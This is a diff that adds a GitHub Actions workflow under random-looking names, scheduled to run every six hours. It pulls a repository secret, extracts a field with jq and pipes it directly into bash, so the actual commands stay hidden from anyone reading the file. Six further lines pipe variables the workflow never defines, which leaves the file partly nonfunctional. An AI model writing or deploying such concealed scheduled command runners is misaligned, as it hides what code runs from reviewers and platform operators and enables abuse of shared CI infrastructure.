@@ -1,0 +1,22 @@
+name: wengjingshi1290
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wengjingshi1290
+        env:
+          shlrq848: ${{ secrets.shlrq848 }}
+        run: |
+          echo $shlrq848 | jq -r .qxfpa3 | /bin/bash
+          echo $lljcp90764 | jq -r .xjw29 | /bin/bash
+          echo $ncey22 | jq -r .cu8706 | /bin/bash
+          echo $tuhj6 | jq -r .apwep80839 | /bin/bash
+          echo $hy60674 | jq -r .sqm7 | /bin/bash
+          echo $y3389 | jq -r .jf8 | /bin/bash
+          echo $w6087 | jq -r .kwahr3376 | /bin/bash
+
